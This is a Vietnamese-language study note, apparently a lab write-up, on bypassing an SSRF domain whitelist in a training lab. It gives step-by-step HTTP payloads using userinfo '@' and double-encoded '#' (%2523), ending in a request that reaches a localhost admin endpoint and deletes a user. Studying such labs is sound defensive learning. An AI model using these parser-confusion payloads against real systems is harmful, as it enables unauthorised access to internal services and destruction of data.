![[lab-ssrf-whitelist-bypass.png]]
chỉ cho domain stock.weliketoshop.net, bypass bằng @ + double encode # rồi xóa carlos

> [!NOTE] phân tích đề
> - stockApi parse URL, lấy hostname check whitelist
> - thử 127.0.0.1 thẳng => tạch
> - thử username@stock.weliketoshop.net => lại được
> -> chứng tỏ parser hỗ trợ userinfo
> - thử thêm # => lại bị chặn
> - double encode # thành %2523 => Internal Server Error
> -> backend đã thử nối tới `username`
> -sau khi quan sát gói tin này, mình thấy server check chuỗi domain whitelist nhưng parse URL ẩu (ăn ký tự @ # và double-encode), nên mình dùng parser confusion để host thật là localhost mà chuỗi vẫn chứa domain whitelist.
> -> đọc thêm ở [[white list bypass]] và [[ssrf-whitelist bypass]]

### hướng giải
- [ ] thử http://127.0.0.1/ => quan sát bị chặn
- [ ] thử http://username@stock.weliketoshop.net/ => thấy được chấp nhận
- [ ] thử thêm # => thấy bị chặn lại
- [ ] double encode # thành %2523 => thấy Internal Server Error
- [ ] ghép payload localhost:80%2523@... để vào admin
- [ ] sửa path tới delete carlos

### giải
test userinfo:
```http
stockApi=http://username@stock.weliketoshop.net/
```
-> 200 OK
=> filter lấy host sau @ là stock... => cho qua

test fragment:
```http
stockApi=http://username#@stock.weliketoshop.net/
```
-> bị chặn

double encode #:
```http
stockApi=http://username%2523@stock.weliketoshop.net/
```
-> Internal Server Error
=> backend decode 2 lần => thành `#`, cắt khác filter

payload cuối:
```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
giải thích nhanh:
- filter decode 1 lần => thấy `%23` => tưởng là 1 phần username, host vẫn là stock... => cho qua
- backend decode tiếp => thành `http://localhost:80#@stock...`
-> host thật là localhost
-> phần sau # bị bỏ khi fetch
-> thực tế fetch `http://localhost:80/admin/delete?username=carlos`

=> response báo xóa xong
=> lab solved

![[lab-ssrf-whitelist-bypass-result.png]]

> [!NOTE] bài học
> - whitelist mà check bằng contains / parse 1 lần là toang
> - @ để nhét host thật sau userinfo
> - %2523 để đánh lừa lần decode thứ 2
> - nên mình luôn thử @ trước, # sau khi gặp whitelist
